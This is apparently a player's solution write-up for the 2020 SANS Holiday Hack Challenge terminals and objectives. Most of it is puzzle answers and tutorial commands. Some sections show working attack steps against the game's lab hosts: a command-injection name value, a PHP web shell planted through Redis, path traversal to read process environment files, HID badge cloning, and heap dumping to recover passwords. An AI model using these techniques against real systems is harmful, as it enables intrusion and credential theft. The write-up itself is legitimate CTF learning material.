## Kringle Kiosk
* Location: Castle Approach
* [Conversation: Shinny Upatree](conversations.md#shinny-upatree)

<details><summary>Click to expand</summary>

challenge=shell

```
Welcome to our castle, we're so glad to have you with us!
Come and browse the kiosk; though our app's a bit suspicious.
Poke around, try running bash, please try to come discover,
Need our devs who made our app pull/patch to help recover?
Escape the menu by launching /bin/bash
Press enter to continue...

~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Welcome to the North Pole!
~~~~~~~~~~~~~~~~~~~~~~~~~~~~
1. Map
2. Code of Conduct and Terms of Use
3. Directory
4. Print Name Badge
5. Exit
Please select an item from the menu by entering a single number.
Anything else might have ... unintended consequences.
Enter choice [1 - 5] 1

 __       _    --------------                                                
|__)_  _ (_   | NetWars Room |                                               
| \(_)(_)|    |              |                                               
              |            * |                                               
               --------------                                                
                                                                             
__  __                              __  __                                   
 _)|_                                _)|_          -------                   
/__|        Tracks                  __)|          |Balcony|                  
            1 2 3 4 5 6 7                          -------                   
 -------    -------------                             |                      
|Speaker|--| Talks Lobby |                        --------                   
|Unprep |  |             |                       |Santa's |                  
 -------    ------       |                       |Office  |                  
                  |      |                        --    --                   
                  |     *|                          |  |                     
                   ------                           |   ---                  
                                                    |    * |                 
    __                                               ------                  
 /||_                                                                        
  ||                                          __ __           --------       
  --------------------------              /| |_ |_           |Wrapping|      
 |        Courtyard         |              |.__)|            |  Room  |      
  --------------------------                                  --------       
    |                    |                                       |           
 ------    --------    ------                          ---    --------       
|Dining|--|Kitchen |--|Great |                            |--|Workshop|      
|      |   --------   |      |                            |  |        |      
| Room |--|      * |--| Room |                            |  |        |      
|      |  |Entryway|  |      |                            |  |        |      
 ------    --------    ------                             |  |        |      
               |                                             | *      |      
           ----------                                         --------       
          |Front Lawn|       NOTE: * denotes Santavator                      
           ----------                                                        
           
Enter choice [1 - 5] 2
# KringleCon III and Holiday Hack Challenge Code of Conduct
1. Use the challenges here to have fun, explore, engage, and develop your cyber security skills!
2. Be kind! Feel free to encourage and help other players! Let Santa's elves (support@holidayhackchallenge.com) know if something seems off. Please be mindful that there are children playing. Santa is watching!
3. Please don't post full answers publicly until the official contest ends on Monday, January 4, 2021.
4. SANS Holiday Hack strives to create an atmosphere of learning, growth, and community. We value the participation and input, in this event and in the industry, of people of all genders, sexual identities, cultures, socioeconomic backgrounds, races, ethnicities, nationalities, religions, and ages. Please support this atmosphere with respectful behavior and speech. This applies to all online interactions associated with KringleCon and the Holiday Hack Challenge, including game chat and discussions.
# KringleCon III and Holiday Hack Challenge Terms of Use
1. This service includes a "group chat" component. We cannot make any guarantees about the accuracy, quality, or age-appropriateness of chat messages.
2. All activity and interactions within Holiday Hack Challenge are monitored and recorded. We use this information to maintain an environment that is both safe and condusive to learning.
3. Players should avoid engaging in techniques on any Holiday Hack Challenge server that may negatively affect the server's operational status and/or availability.
4. Players must not attack Holiday Hack Challenge servers (*.holidayhackchallenge.com, *.kringlecon.com, etc.) unless otherwise directed. If you have any questions about target scope, please email: support@holidayhackchallenge.com.
5. E-mail addresses collected will be used in accordance with the SANS Privacy Policy (https://www.sans.org/privacy/).

Enter choice [1 - 5] 3
Name:               Floor:      Room:
Bushy Evergreen     2           Talks Lobby
Sugarplum Mary      1           Courtyard
Sparkle Redberry    1           Castle Entry
Tangle Coalbox      1           Speaker UNPreparedness
Minty Candycane     1.5         Workshop
Alabaster Snowball  R           NetWars Room
Pepper Minstix                  Front Lawn
Holly Evergreen     1           Kitchen
Wunorse Openslae    R           NetWars Room
Shinny Upatree                  Front Lawn

```

Solution:
```
Enter choice [1 - 5] 4
Enter your name (Please avoid special characters, they cause some weird errors)...hello;/bin/bash
 _______
< hello >
 -------
  \
   \   \_\_    _/_/
    \      \__/
           (oo)\_______
           (__)\       )\/\
               ||----w |
               ||     ||
   ___                                                      _    
  / __|   _  _     __      __      ___     ___     ___     | |   
  \__ \  | +| |   / _|    / _|    / -_)   (_-<    (_-<     |_|   
  |___/   \_,_|   \__|_   \__|_   \___|   /__/_   /__/_   _(_)_  
_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_| """ | 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
Type 'exit' to return to the menu.
```
</details>


## Investigate S3 Bucket
* Location: Castle Approach
* [Conversation: Shinny Upatree](conversations.md#shinny-upatree)
* [Objective 02](objectives.md#02---investigate-s3-bucket-)

challenge=awsbucket

Usage: https://digi.ninja/projects/bucket_finder.php

Solution:
```bash
cd bucket_finder/; echo "wrapper3000" >> wordlist; ./bucket_finder.rb wordlist --download; cd wrapper3000/
base64 -d package | zcat | bzip2 -d | tar xf - > package.txt.Z.xz.xxd
xxd -r package.txt.Z.xz.xxd | xz -d | gzip -d -
```


## Unescape Tmux
* Location: Castle Approach
* [Conversation: Pepper Minstix](conversations.md#pepper-minstix)

challenge=tmux

Can you help me?
I was playing with my birdie (she's a Green Cheek!) in something called **tmux**,
then I did something and it disappeared!
Can you help me find her? We were so **attach**ed!!

Solution:
```bash
tmux list-sessions
tmux attach
```


## The Elf Code
* Location: Dining Room
* [Conversation: Ribb Bonbowford](conversations.md#ribb-bonbowford)

### Level 1
```javascript
elf.moveTo(lollipop[0])
elf.moveUp(10)
```

### Level 2 - Trigger The Yeeter
```javascript
elf.moveLeft(6)
elf.pull_lever(elf.get_lever(0) + 2)
elf.moveLeft(4)
elf.moveUp(10)
```

## Level 3
```javascript
elf.moveTo(lollipop[0])
elf.moveTo(lollipop[1])
elf.moveTo(lollipop[2])
elf.moveUp(1)
```

## Level 4 - Up Down Loopiness
```javascript
for (var i = 0; i < 3; i++) {
  elf.moveLeft(3)
  elf.moveUp(13)
  elf.moveLeft(3)
  elf.moveDown(13)
}
elf.moveUp(13)
```

## Level 5 - Move To Madness
```javascript
var q = elf.ask_munch(0)
var a = q.filter(elem => typeof elem === 'number')
console.log(q + '\n' + a)
elf.moveTo(lollipop[1])
elf.moveTo(lollipop[0])
elf.tell_munch(a)
elf.moveUp(2)
```

### Level 6 - Two Paths, Your Choice
```javascript
var obj = elf.ask_munch(0)
var a = ""
Object.keys(obj).forEach(function(k) {
  if (obj[k] == 'lollipop') {
    console.log(k + ' - ' + obj[k]);
    a = k;
  }
});
for (var l = 0; l < 4; l++) { elf.moveTo(lollipop[l]) }
elf.moveTo(munchkin[0])
elf.tell_munch(a)
elf.moveUp(2)
```

## Sort-O-Matic
* Location: Workshop
* [Conversation: Minty Candycane](conversations.md#minty-candycane)

challenge=regex

1. Matches at least one digit
```
\d
```
2. Matches 3 alpha a-z characters ignoring case
```
[a-zA-Z]{3}
```
3. Matches 2 chars of lowercase a-z or numbers
```
[a-z0-9]{2}
```
4. Matches any 2 chars not uppercase A-L or 1-5
```
[^A-L1-5]{2}
```
5. Matches three or more digits only
```
^[0-9]{3,}$
```
6. Matches multiple hour:minute:second time formats only
```
^[0-2]?[0-9]{1}:[0-5]{1}[0-9]{1}:[0-5]{1}[0-9]{1}$
```
7. Matches MAC address format only while ignoring case
```
^([0-9a-fA-F]{2}):([0-9a-fA-F]{2}):([0-9a-fA-F]{2}):([0-9a-fA-F]{2}):([0-9a-fA-F]{2}):([0-9a-fA-F]{2})$
```
8. Matches multiple day, month, and year date formats only
```
^(0[1-9]|[12][0-9]|3[01])[- /.](0[1-9]|1[012])[- /.](19|20)\d\d$
```

## Linux Primer
* Location: Courtyard
* [Conversation: Sugarplum Mary](conversations.md#sugarplum-mary)

challenge=linux

The North Pole 🍭 Lollipop Maker:
All the lollipops on this system have been stolen by munchkins. Capture munchkins by following instructions here and 🍭's will appear in the green bar below. Run the command "hintme" to receive a hint.

```bash
ls ~
cat munchkin*
rm munchkin*
pwd
ls -la
rm .munchkin*
history
env | grep -i munch
cd workshop/
grep -i munch *
chmod u+x lollipop_engine
./lollipop_engine
cd /home/elf/workshop/electrical
mv blown_fuse0 fuse0
ln -s fuse0 fuse1
cp fuse1 fuse2
echo "MUNCHKIN_REPELLENT" >> fuse2
find /opt/munchkin_den/
find /opt/munchkin_den/
find /opt/munchkin_den/
ps -ef| grep -i munch
netstat -nlpt
curl localhost:54321
kill $(ps -ef | grep -i munchkin | grep -v grep | awk '{print $2}')
exit
```

## Santa Shop
* Location: Courtyard
* [Conversation: Sugarplum Mary](conversations.md#sugarplum-mary)
* [Objective 03](objectives.md#03---point-of-sale-password-recovery-)

challenge=

* spin up a nodejs container and extract .asar file from .exe
* find password in main.js

```bash
docker run -it --rm node /bin/bash
apt update && apt install -f wget p7zip p7zip-full less
npm install -g asar
wget https://download.holidayhackchallenge.com/2020/santa-shop/santa-shop.exe
mkdir extracted app source
7z -oextracted/ x santa-shop.exe
7z -oapp/ x extracted/\$PLUGINSDIR/app-64.7z
asar list app/resources/app.asar
asar extract app/resources/app.asar source
rm -rf extracted app
cat README.md
grep PASSWORD main.js
```

## 33.6kbps
* Location: Kitchen
* [Conversation: Fitzy Shortstack](conversations.md#fitzy-shortstack)

```
Pick up handset
Dial 'SKOUDIS' (756-8347)
Click 'baa DEE brrr'
Click 'aaah'
Click 'WEWEWWRWRRWRR'
Click 'beDURRdunditty'
Click 'SCHHRRHHRTHRTR'
```

## HID Lock
* Location: Workshop
* [Objective 05](objectives.md#05---open-hid-lock-)

* Use your Proxmark3 in your Badge Items inventory to scan Shinny Upatree's HID badge

```
[magicdust] pm3 --> lf hid read
#db# TAG ID: 2006e22f13 (6025) - Format Len: 26 bit - FC: 113 - Card: 6025
[+] Valid HID Prox ID found!
```

* Simulate that card in front of the locked door in the Workshop

```
[magicdust] pm3 --> lf hid sim -r 2006e22f13 --fc 113 --cn 6025
[=] Simulating HID tag using raw 2006e22f13
[=] Stopping simulation after 10 seconds.
[=] Done
```

* Location: ???

Become Santa?!?


## Speaker UNPrep
* Location: Talks Lobby
* [Conversation: Bushy Evergreen](conversations.md#bushy-evergreen)

challenge=santamode-speaker

### Open the door

Super simple

```bash
strings door|grep -i password
```

**Answer**: Op3nTheD00r


### Turn on the lights

Here are a few commands that can be run to dump the memory heap of the process to a file, where you can see the decrypted password in plain text.

```bash
# start term
./lights
# ctrl + z

cd lab;
pid=$(jobs -p)
addrs=$(grep rw-p /proc/${pid}/maps | grep heap | awk '{print $1}')
start=$(echo $addrs | cut -d- -f1)
stop=$(echo $addrs | cut -d- -f2)
gdb --batch --pid ${pid} -ex "dump memory pid${pid}-heap-$start-$stop.dump 0x$start 0x$stop"
strings pid*heap*.dump

# there's the password, now go enter it!
/home/elf/lights
```

**Answer**: Computer-TurnLightsOn

### Turn on the vending machine

I wrote a short bash script to cycle through input characters and see how the encoded output changes. 

```bash
echo "Match this: LVEdQPpBwr"
known="$1"
for i in {a..z} {A..Z} {0-9}; do
  rm vending-machines.json;
  echo -e "me\n${known}${i}" | ./vending-machines >/dev/null
  out=$(cat vending-machines.json | grep password | awk -F: '{print $2}')
  echo "${known}${i} ->$out"
done
```

To start, you just run the script, and it automates the process of deleting the json file, running the binary, giving it an input, and reading the resulting output from the new json. Once you find a match for the first character, you stop the script and re-run it with the inputs you already know, and continue until you have every character of the password. I could automate this further, to grep for a match so it runs completely on its own, but this worked fine as is.

**Answer**: CandyCane1


## Splunk
* Location: Great Room
* [Conversation: Angel Candysalt](conversations.md#angel-candysalt)
* [Objective 06](objectives.md#06---splunk-challenge-)

https://splunk.kringlecastle.com/en-US/app/SA-kringleconsoc/kringleconsoc

### Training Questions

1.	How many distinct MITRE ATT&CK techniques did Alice emulate?

Splunk Query:
```
| tstats count where index=t* by index 
| rex field=index mode=sed "s/(\.|-).*$//" 
| dedup index
```

```
= 13
```


2.	What are the names of the two indexes that contain the results of emulating Enterprise ATT&CK technique 1059.003? (Put them in alphabetical order and separate them with a space)

```
= t1059.003-main t1059.003-win
```


3.	One technique that Santa had us simulate deals with 'system information discovery'. What is the full name of the registry key that is queried to determine the MachineGuid?

https://attack.mitre.org/techniques/enterprise/

search for "system information discovery"

https://attack.mitre.org/techniques/T1082/


Splunk Query:
```
| tstats count where index=* by index 
| rex field=index "(?<technique>t\d+)[\.\-].0*"
|  search technique=t1082
```

Splunk Query:
```
index=t1082-win MachineGuid
```

```
= HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography
```


4.	According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.)

Splunk Query:
```
index=attack OSTAP 
| stats values(Execution Time _UTC) by _time
```

```
= 2020-11-30T17:44:15Z
```


5.	One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component?

https://github.com/frgnca/AudioDeviceCmdlets

Splunk Query:
```
index=attack audio
```

Splunk Query:
```
| tstats count where index=* by index 
| rex field=index "(?<technique>t\d+)[\.\-].0*"
|  search technique=t1123
```

Splunk Query:
```
index=t1123-win EventID=1 ProcessId ParentCommandLine="*powershell.exe*"
| dedup ParentCommandLine
| stats values(ParentCommandLine) by ProcessId, _time
| sort _time
```

```
= 3648
```


6.	Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation?

Splunk Query:
```
index=attack registry
```

Splunk Query:
```
| tstats count where index=* by index 
| rex field=index "(?<technique>t\d+)[\.\-].0*"
|  search technique=t1547
```

Splunk Query:
```
index=t1547.001-win EventID=1 ProcessId ParentCommandLine="*powershell.exe*"
| dedup ParentCommandLine
| stats values(ParentCommandLine) by ProcessId, _time
| sort _time
```


https://attack.mitre.org/techniques/T1547/001/

Splunk Query:
```
index=* file_name="*.bat" 
| stats values(file_name)
```

Discovery.bat

https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Misc/Discovery.bat

```
= quser
```


7.	According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range?

Splunk Query:
```
index=* sourcetype=bro* source="/opt/zeek/logs/current/x509.log" "certificate.issuer"="CN=win-dc*"
| stats values(certificate.serial) by certificate.issuer
```

```
= 55FCEEBB21270D9249E86F4B9DC7AA60
```


8. Challenge Question: What is the name of the adversary group that Santa feared would attack KringleCon?

RFC 7465 = Prohibiting RC4 Cipher Suites

https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)RC4(%7B'option':'UTF8','string':'Stay%20Frosty'%7D,'Latin1','Latin1')&input=N0ZYalAxbHlmS2J5REsvTUNoeWYzNmg3

```
= The Lollipop Guild
```


## CAN-Bus Investigation
* Location: Roof / NetWars
* [Conversation: Wunorse Openslae](conversations.md#wunorse-openslae)

challenge=santamode-canbus

```bash
$ cat candump.log | awk '{print $3}' | sort | uniq -c | head
     35 188#00000000
      2 19B#000000000000   ## Lock?
      1 19B#00000F000000   ## Unlock?
      1 244#0000000012
      1 244#0000000024
      1 244#0000000036
      1 244#0000000048
      1 244#000000005A
      1 244#000000006C
      1 244#000000007E

$ cat candump.log | grep 19B                                
(1608926661.626380) vcan0 244#000000019B
(1608926662.390980) vcan0 244#000000019B
(1608926664.626448) vcan0 19B#000000000000  ## Lock?
(1608926667.837300) vcan0 244#00000019BE
(1608926671.122520) vcan0 19B#00000F000000  ## Unlock?
(1608926673.157900) vcan0 244#00000019BE
(1608926674.092148) vcan0 19B#000000000000  ## Lock?

$ grep "19B#00000F000000" candump.log
(1608926671.122520) vcan0 19B#00000F000000

$ ./runtoanswer 122520
Your answer: 122520
Checking....
Your answer is correct!
```


## Sleigh CAN-D-Bus
* Location: Roof / NetWars
* [Conversation: Wunorse Openslae](conversations.md#wunorse-openslae)

challenge=candbus

```
019  Steering
02A  Start / Stop
080  Brake
188  ?
19B  Locks
244  RPM

Start     = 02A#00FF00
Stop      = 02A#0000FF
Lock      = 19B#000000000000
Unlock    = 19B# 00 00 0F 00 00 00
Accel/RPM = 244# 
  100     = 00 00 00 00 23 7F  (9087 RPM)

Brake    = 080#
  0      = 000000
  1      = 000001
  3      = 000003
  4      = 000004  +  FFFFF? junk
  100    = 00 00 64

Steering = 019#
  0      = 000000000000
  -50    = FFFFFFFFFFCD
  50     = 000000000032
  
## clear noise
Brake     080 Equals 00 00 00 00 00 00
Steering  019 Equals 00 00 00 00 00 00
RPM       244 Equals 00 00 00 00 00 00
?         188 Equals 00 00 00 00 00 00

## deFrost filters
Locks  19B Equals   00 00 00 0F 20 57
Brake  080 Contains __ __ __ FF __ __
```

## Redis Bug Hunt
* Location: Kitchen
* [Conversation: Holly Evergreen](conversations.md#holly-evergreen)

challenge=redis

https://book.hacktricks.xyz/pentesting/6379-pentesting-redis

First, use the maint cmd "CONFIG GET \*" to get the password

```bash
curl http://localhost/maintenance.php?cmd=config,get,*
```

Then use that password to use a much easier shell to grab the contents of index.php

```bash
redis-cli --raw -a 'R3disp@ss'

flushall

config set dir /var/www/html/
config set dbfilename test.php
set test "<?php $out = shell_exec('ls -la; cat /var/www/html/index.php'); echo $out; ?>"
save
exit

curl -o- http://localhost/test.php

REDIS0009�      redis-ver5.0.3�
�edis-bits�@�ctime�V>�_used-mem��
 aof-preamble��� test@Mtotal 24
drwx------ 1 www-data www-data 4096 Dec 22 00:31 .
drwxr-xr-x 1 root     root     4096 Nov 24 18:52 ..
-rwx------ 1 www-data www-data  488 Dec 22 00:30 index.php
-rwx------ 1 www-data www-data  783 Nov 24 18:50 maintenance.php
-rw-r--r-- 1 root     root      182 Dec 22 00:31 test.php
<?php
# We found the bug!!
#
#         \   /
#         .\-/.
#     /\ ()   ()
#       \/~---~\.-~^-.
# .-~^-./   |   \---.
#      {    |    }   \
#    .-~\   |   /~-.
#   /    \  A  /    \
#         \/ \/
# 
echo "Something is wrong with this page! Please use http://localhost/maintenance.php to se
e if you can figure out what's going on"
?>
```


## Tag Generator
* Location: Wrapping Room
* [Conversation: Noel Boetie](conversations.md#noel-boetie)
* [Conversation: Holly Evergreen](conversations.md#holly-evergreen)
* [Conversation: Shinny Upatree](conversations.md#shinny-upatree)

https://tag-generator.kringlecastle.com/

First, try to upload an invalid file, like "test.txt"

```
Error in /app/lib/app.rb: Unsupported file type: /tmp/RackMultipart20201220-1-1lvj6ur.txt
```

Now we know the full path and filename of the application. 

If we try uploading a valid png/jpg file and watch the browser's DevTools Network tab, we see the /image?id=xxx endpoint returns our uploaded image back to us.

Trying directory traversal with the full path to the web app, we can download the source code of the app:

```bash
$ curl --location --request GET 'https://tag-generator.kringlecastle.com/image?id=../app/lib/app.rb'
```

That's cool, but we really want value of an environment variable. Maybe we can get that env var from the /proc/ filesystem using the same directory traversal trick?

```bash
$ curl -o- -s 'https://tag-generator.kringlecastle.com/image?id=../proc/1/environ' | sed 's/\x00/\n/g'

PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=cbf2810b7573
RUBY_MAJOR=2.7
RUBY_VERSION=2.7.0
RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343
GEM_HOME=/usr/local/bundle
BUNDLE_SILENCE_ROOT_WARNING=1
BUNDLE_APP_CONFIG=/usr/local/bundle
APP_HOME=/app
PORT=4141
HOST=0.0.0.0
GREETZ=JackFrostWasHere
HOME=/home/app
```

Yes, yes we can :)


## Scapy Prepper
* Location: Roof / NetWars
* [Conversation: Alabaster Snowball](conversations.mds#alabaster-snowball)

```
>>> task.get()
Welcome to the "Present Packet Prepper" interface! The North Pole could use your help prep
aring present packets for shipment.
Start by running the task.submit() function passing in a string argument of 'start'.
Type task.help() for help on this question.
>>>

>>> task.submit('start')
Correct! adding a () to a function or class will execute it. Ex - FunctionExecuted()


Submit the class object of the scapy module that sends packets at layer 3 of the OSI model.
>>> task.submit(send)
Correct! The "send" scapy class will send a crafted scapy packet out of a network interface.


Submit the class object of the scapy module that sniffs network packets and returns those packets in a list.

>>> task.submit(sniff)
Correct! the "sniff" scapy class will sniff network traffic and return these packets in a list.


Submit the NUMBER only from the choices below that would successfully send a TCP packet and then return the first sniffed response packet to be stored in a variable named "pkt":
1. pkt = sr1(IP(dst="127.0.0.1")/TCP(dport=20))
2. pkt = sniff(IP(dst="127.0.0.1")/TCP(dport=20))
3. pkt = sendp(IP(dst="127.0.0.1")/TCP(dport=20))

>>> task.submit(1)
Correct! sr1 will send a packet, then immediately sniff for a response packet.

Submit the class object of the scapy module that can read pcap or pcapng files and return a list of packets.
Look for "Read a pcap or pcapng file and return a packet list" at the link ( https://scapy.readthedocs.io/en/latest/api/scapy.utils.html )

>>> task.submit(rdpcap)
Correct! the "rdpcap" scapy class can read pcap files.

The variable UDP_PACKETS contains a list of UDP packets. Submit the NUMBER only from the choices below that correctly prints a summary of UDP_PACKETS:
1. UDP_PACKETS.print()
2. UDP_PACKETS.show()
3. UDP_PACKETS.list()

>>> task.submit(2)
Correct! .show() can be used on lists of packets AND on an individual packet.

Submit only the first packet found in UDP_PACKETS.
You can specify an item from a list using "list_var_name[num]" where "num" is the item number you want starting at 0.


>>> task.submit(UDP_PACKETS[0])
Correct! Scapy packet lists work just like regular python lists so packets can be accessed by their position in the list starting at offset 0.

Submit only the entire TCP layer of the second packet in TCP_PACKETS.
If you had a packet stored in a variable named pkt, you could access its IP layer using "pkt[IP]"

>>> task.submit( TCP_PACKETS[1][TCP] )
Correct! Most of the major fields like Ether, IP, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, Raw, etc... can be accessed this way. Ex - pkt[IP][TCP]

Change the source IP address of the first packet found in UDP_PACKETS to 127.0.0.1 and then submit this modified packet

>>> task.submit( UDP_PACKETS[1] )
Correct! You can change ALL scapy packet attributes using this method.

Submit the password "task.submit('elf_password')" of the user alabaster as found in the packet list TCP_PACKETS.

You can access each packets Raw payload using TCP_PACKETS[0][Raw].load only incrementing 0 each packet. (if that particular packet has a payload)

>>> TCP_PACKETS.show()
0000 Ether / IP / TCP 192.168.0.114:1137 > 192.168.0.193:ftp S
0001 Ether / IP / TCP 192.168.0.193:ftp > 192.168.0.114:1137 SA
0002 Ether / IP / TCP 192.168.0.114:1137 > 192.168.0.193:ftp A
0003 Ether / IP / TCP 192.168.0.193:ftp > 192.168.0.114:1137 PA / Raw
0004 Ether / IP / TCP 192.168.0.114:1137 > 192.168.0.193:ftp PA / Raw
0005 Ether / IP / TCP 192.168.0.193:ftp > 192.168.0.114:1137 PA / Raw
0006 Ether / IP / TCP 192.168.0.114:1137 > 192.168.0.193:ftp PA / Raw
0007 Ether / IP / TCP 192.168.0.193:ftp > 192.168.0.114:1137 PA / Raw

>>> task.submit( TCP_PACKETS[6][Raw].load )
Correct! Here is some really nice list comprehension that will grab all the raw payloads from tcp packets:
[pkt[Raw].load for pkt in TCP_PACKETS if Raw in pkt]

The ICMP_PACKETS variable contains a packet list of several icmp echo-request and icmp echo-reply packets. Submit only the ICMP chksum value from the second packet in the ICMP_PACKETS list.

>>> ICMP_PACKETS[1].show()
###[ Ethernet ]### 
  dst       = 00:0c:29:d0:96:b3
  src       = 00:50:56:f9:54:66
  type      = IPv4
###[ IP ]### 
     version   = 4
     ihl       = 5
     tos       = 0x0
     len       = 84
     id        = 2585
     flags     = 
     frag      = 0
     ttl       = 128
     proto     = icmp
     chksum    = 0xe69b
     src       = 10.21.23.12
     dst       = 10.21.23.12
     \options   \
###[ ICMP ]### 
        type      = echo-reply
        code      = 0
        chksum    = 0x4c44
        id        = 0x6d38
        seq       = 0x1
        unused    = ''
###[ Raw ]### 
           load      = 'L=\xa7^\x00\x00\x00\x00\x88\x13\x0c\x00\x00\x00\x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !"#$%&\'()*+,-./01234567'

You could get the ICMP id value of the 3rd packet using ICMP_PACKETS[2][ICMP].id .

>>> task.submit( ICMP_PACKETS[1][ICMP].chksum )
Correct! You can access the ICMP chksum value from the second packet using ICMP_PACKETS[1][ICMP].chksum .

Submit the number of the choice below that would correctly create a ICMP echo request packet with a destination IP of 127.0.0.1 stored in the variable named "pkt"
1. pkt = Ether(src='127.0.0.1')/ICMP(type="echo-request")
2. pkt = IP(src='127.0.0.1')/ICMP(type="echo-reply")
3. pkt = IP(dst='127.0.0.1')/ICMP(type="echo-request")

>>> task.submit(3)
Correct! Once you assign the packet to a variable named "pkt" you can then use that variable to send or manipulate your created packet.

Create and then submit a UDP packet with a dport of 5000 and a dst IP of 127.127.127.127. (all other packet attributes can be unspecified)

Here is a good link on creating packets with scapy ( https://0xbharath.github.io/art-of-packet-crafting-with-scapy/scapy/creating_packets/index.html )

>>> task.submit( IP(dst='127.127.127.127')/UDP(dport=5000) )
Correct! Your UDP packet creation should look something like this:
pkt = IP(dst="127.127.127.127")/UDP(dport=5000)
task.submit(pkt)

Create and then submit a UDP packet with a dport of 53, a dst IP of 127.2.3.4, and is a DNS query with a qname of "elveslove.santa". (all other packet attributes can be unspecified)

You can reference UDP_PACKETS[0] for a similar packet but dont use this exact packet but create a new one. You can also reference this link ( https://0xbharath.github.io/art-of-packet-crafting-with-scapy/scapy/creating_packets/index.html )

>>> UDP_PACKETS[0].show()
###[ Ethernet ]### 
  dst       = 00:c0:9f:32:41:8c
  src       = 00:e0:18:b1:0c:ad
  type      = IPv4
###[ IP ]### 
     version   = 4
     ihl       = 5
     tos       = 0x0
     len       = 60
     id        = 0
     flags     = DF
     frag      = 0
     ttl       = 64
     proto     = udp
     chksum    = 0x6543
     src       = 192.168.170.8
     dst       = 192.168.170.20
     \options   \
###[ UDP ]### 
        sport     = 32795
        dport     = domain
        len       = 40
        chksum    = 0xaf61
###[ DNS ]### 
           id        = 30144
           qr        = 0
           opcode    = QUERY
           aa        = 0
           tc        = 0
           rd        = 1
           ra        = 0
           z         = 0
           ad        = 0
           cd        = 0
           rcode     = ok
           qdcount   = 1
           ancount   = 0
           nscount   = 0
           arcount   = 0
           \qd        \
            |###[ DNS Question Record ]### 
            |  qname     = 'www.elves.rule.'
            |  qtype     = A
            |  qclass    = IN
           an        = None
           ns        = None
           ar        = None


>>> task.submit( IP(dst='127.2.3.4')/UDP(dport=53)/DNS(qd=DNSQR(qname='elveslove.santa'))
... )
Correct! Your UDP packet creation should look something like this:
pkt = IP(dst="127.2.3.4")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="elveslove.santa"))
task.submit(pkt)

The variable ARP_PACKETS contains an ARP request and response packets. The ARP response (the second packet) has 3 incorrect fields in the ARP layer. Correct the second packet in ARP_PACKETS to be a proper ARP response and then task.submit(ARP_PACKETS) for inspection.

The three fields in ARP_PACKETS[1][ARP] that are incorrect are op, hwsrc, and hwdst. A sample ARP pcap can be referenced at https://www.cloudshark.org/captures/e4d6ea732135. You can run the "reset_arp()" function to reset the ARP packets back to their original form.


>>> ARP_PACKETS[0].show()
###[ Ethernet ]### 
  dst       = ff:ff:ff:ff:ff:ff
  src       = 00:16:ce:6e:8b:24
  type      = ARP
###[ ARP ]### 
     hwtype    = 0x1
     ptype     = IPv4
     hwlen     = 6
     plen      = 4
     op        = who-has
     hwsrc     = 00:16:ce:6e:8b:24
     psrc      = 192.168.0.114
     hwdst     = 00:00:00:00:00:00
     pdst      = 192.168.0.1


>>> ARP_PACKETS[1].show()
###[ Ethernet ]### 
  dst       = 00:16:ce:6e:8b:24
  src       = 00:13:46:0b:22:ba
  type      = ARP
###[ ARP ]### 
     hwtype    = 0x1
     ptype     = IPv4
     hwlen     = 6
     plen      = 4
     op        = None
     hwsrc     = ff:ff:ff:ff:ff:ff
     psrc      = 192.168.0.1
     hwdst     = ff:ff:ff:ff:ff:ff
     pdst      = 192.168.0.114
###[ Padding ]### 
        load      = '\xc0\xa8\x00r'


ARP_PACKETS[1][ARP].op = 0x2
ARP_PACKETS[1][ARP].hwdst = '00:16:ce:6e:8b:24'
ARP_PACKETS[1][ARP].hwsrc = '00:13:46:0b:22:ba'


>>> task.submit( ARP_PACKETS )
Great, you prepared all the present packets!

Congratulations, all pretty present packets properly prepared for processing!
```


## ARP Shenanigans
* Location: Roof / NetWars
* [Conversation: Alabaster Snowball](conversations.md#alabaster-snowball)

challenge=santamode-arp


## Greeting Cards
* Location: Talks Lobby
* [Conversation: Chimney Scissorsticks](conversations.md#chimney-scissorsticks)

https://greeting-cards.kringlecastle.com/


## Snowball Fight
* Location: Speaker UNPreparedness Room
* [Conversation: Tangle Coalbox](conversations.md#tangle-coalbox)

challenge=santamode-snowball


## Naughty/Nice List
* Location: Santa's Office
* [Conversation: Tinsel Upatree](conversations.md#tinsel-upatree)

https://download.holidayhackchallenge.com/2020/blockchain.dat

